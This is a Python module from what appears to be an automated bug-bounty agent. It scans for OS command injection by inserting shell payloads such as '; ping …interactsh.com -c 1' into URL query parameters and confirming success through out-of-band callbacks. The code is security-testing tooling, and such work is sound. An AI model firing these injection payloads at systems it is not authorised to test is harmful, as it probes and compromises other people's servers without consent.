"""
Implements: Section 7.8 -- cmd_injection.py
Blueprint: bb_agent_v6.6_final_blueprint.md

PURE OOB, NO IN-BAND FALLBACK -- Section 7.8's own text, in full:
"Detection + safe exploit: OOB only. `; ping {interactsh_url} -c 1`.
Verify callback. No destructive command." Unlike `ssrf_scanner.py`
(Section 7.3, item 83), which has an in-band path independent of
interactsh, this scanner has none: when `interactsh_client` is `None`
or its `.mode` is already `InteractshMode.UNAVAILABLE`, `scan()`
returns `[]` entirely (Section 4.3: "CMDi/XXE/Deser skip OOB phase" --
for CMDi there is no other phase to fall back to).

`interactsh_client: InteractshClient | None = None` -- EXACT NAME,
PINNED (docs/DECISIONS.md item 83, Waild's directive): identical
declaration to `ssrf_scanner.SSRFScanner`.

`is_allowed_outbound` / `RateLimitedClient` -- SAME CONCLUSION AS ITEM
83, RE-CHECKED AGAINST THIS SCANNER'S OWN REQUEST PATTERN, NOT ASSUMED
FROM SSRF'S SILENCE (docs/DECISIONS.md item 84 has the full re-trace):
the injected payload (a shell metacharacter sequence embedding an
interactsh hostname, e.g. `"; ping XBOW_xxx.interactsh.com -c 1"`) is a
QUERY-PARAMETER VALUE delivered to `target_url`, never a destination
`self.session` connects to -- the vulnerable target's shell is what
resolves and pings the hostname, not this scanner. OOB polling goes
through `InteractshClient`'s own dedicated session (item 81). No
`RateLimitedClient` change needed here either.

ONE `oob_url` PER PARAMETER, CONCURRENT POLLING, BARE
`probe_correlation_id` -- identical mechanism and rationale to
`ssrf_scanner.py`'s `_scan_oob` (item 83); see that module's docstring
for the full reasoning, not re-derived here.

SEPARATOR x OS VARIANTS ARE AUTHORED, NOT BLUEPRINT-ENUMERATED --
Section 7.8 gives exactly one literal example (`; ping ... -c 1`, a
Unix/Linux `;`-separator payload). `cmd_payloads.json` extends this to
four common shell metacharacter contexts (`;`, `|`, `&&`, newline)
across two ping-count-flag OS variants (`-c 1` Unix/Linux, `-n 1`
Windows) -- 8 entries total. Flagged the same "authored, not
blueprint-enumerated" way `sqli_scanner.py`'s `DB_ERROR_SIGNATURES` and
`ssrf_scanner.py`'s GCP/Azure body markers already are: a single
literal example does not mean a single payload is what a real target
needs to trip over -- different injection contexts break out with
different characters, and not knowing the target OS in advance is the
entire reason both ping-flag variants are sent. `-c 1`/`-n 1` are both
single-echo, non-destructive, matching Section 10.1's `TIER_C_RULES`
auto_allow entry verbatim: "CMDi OOB interactsh ping only (no
destructive command)."
"""

from __future__ import annotations

import asyncio
import json
import logging
from pathlib import Path

from core.governance.scope_enforcer import INTERACTSH_SUFFIX
from core.http.interactsh_client import InteractshClient
from core.ontology.enums import InteractshMode, OOBPollOutcome
from core.ontology.findings import ExploitCandidate
from core.scanners.base_scanner import BaseScanner
from core.scanners.param_injection import iter_query_param_injections
from core.scanners.registry import register

PAYLOAD_FILE = Path(__file__).resolve().parent.parent.parent / "data" / "payloads" / "cmd_payloads.json"
RAW_RESPONSE_SNAPSHOT_CHARS = 512  # Section 10.7's call_target() convention

logger = logging.getLogger(__name__)


def _load_payloads(path: Path = PAYLOAD_FILE) -> list[dict]:
    """Loads and returns the `payloads` array from `cmd_payloads.json`."""
    data = json.loads(path.read_text(encoding="utf-8"))
    return data["payloads"]


@register("cmd_injection")
class CmdInjectionScanner(BaseScanner):
    """Section 7.8. See module docstring for the pure-OOB design and
    the separator x OS variant set."""

    def __init__(
        self,
        session,
        *,
        payloads: list[dict] | None = None,
        interactsh_client: InteractshClient | None = None,
    ) -> None:
        """
        Args:
            session: See `BaseScanner`.
            payloads: See `xss_scanner.XSSScanner`.
            interactsh_client: See `ssrf_scanner.SSRFScanner`. `None`
                (default) means `scan()` returns `[]` -- see module
                docstring, this scanner has no non-OOB path.
        """
        super().__init__(session)
        self._payloads = payloads if payloads is not None else _load_payloads()
        self._interactsh_client = interactsh_client

    async def scan(self, target_url: str) -> list[ExploitCandidate]:
        """See module docstring.

        Args:
            target_url: See `BaseScanner.scan`.

        Returns:
            `[]` if `target_url` has no query parameters, no payload
            entries are loaded, or no usable `interactsh_client` was
            provided. Otherwise one `ExploitCandidate` per (parameter,
            payload variant) combination whose OOB callback was
            received.
        """
        if not self._payloads or not iter_query_param_injections(target_url, "_probe"):
            return []
        if self._interactsh_client is None or self._interactsh_client.mode is InteractshMode.UNAVAILABLE:
            logger.info(
                "[CMD_INJECTION_OOB_UNAVAILABLE] %s -- no OOB path, scan skipped (Section 7.8: OOB only)",
                target_url,
            )
            return []

        param_names = [pt.parameter for pt in iter_query_param_injections(target_url, "_probe")]

        # One fresh correlation ID per (parameter, payload-variant) pair
        # -- not one shared across all of them. See ssrf_scanner.py's
        # module docstring ("ONE oob_url PER PARAMETER") for why: a
        # shared ID would make ExploitCandidate.parameter unrecoverable
        # once more than one probe is in flight, and here there are
        # both multiple parameters AND multiple payload variants per
        # parameter.
        probes: list[tuple[str, str, str, str]] = []  # (parameter, payload_id, oob_url, injected_url)
        for param_name in param_names:
            for entry in self._payloads:
                oob_url = self._interactsh_client.register_probe()
                payload = entry["payload_template"].format(oob_url=oob_url)
                injected_url = next(
                    pt.url
                    for pt in iter_query_param_injections(target_url, payload)
                    if pt.parameter == param_name
                )
                probes.append((param_name, payload, oob_url, injected_url))

        # Send every probe first, then poll all of them concurrently --
        # same "bound wall-clock cost to ~5 minutes regardless of probe
        # count" rationale as ssrf_scanner.py's _scan_oob (item 83).
        # Response text is captured here too, same as ssrf_scanner.py's
        # OOB path -- not the proof (the callback is), but still the
        # actual response backing the request, matching
        # ExploitCandidate.raw_response_snapshot's documented intent.
        response_texts: dict[tuple[str, str], str] = {}  # (parameter, oob_url) -> text
        for param_name, _payload, oob_url, injected_url in probes:
            response = await self.session.request("GET", injected_url)
            response_texts[(param_name, oob_url)] = response.text

        outcomes = await asyncio.gather(
            *(self._interactsh_client.poll(oob_url) for _p, _pl, oob_url, _u in probes)
        )

        candidates: list[ExploitCandidate] = []
        for (param_name, payload, oob_url, _injected_url), outcome in zip(probes, outcomes):
            if outcome is OOBPollOutcome.RECEIVED:
                correlation_id = oob_url.removesuffix(INTERACTSH_SUFFIX)
                candidates.append(
                    ExploitCandidate(
                        vuln_type="cmd_injection",
                        endpoint=target_url,
                        http_method="GET",
                        parameter=param_name,
                        detected_by="cmd_injection",
                        payload_used=payload,
                        raw_response_snapshot=response_texts[(param_name, oob_url)][:RAW_RESPONSE_SNAPSHOT_CHARS],
                        probe_correlation_id=correlation_id,
                    )
                )
        return candidates
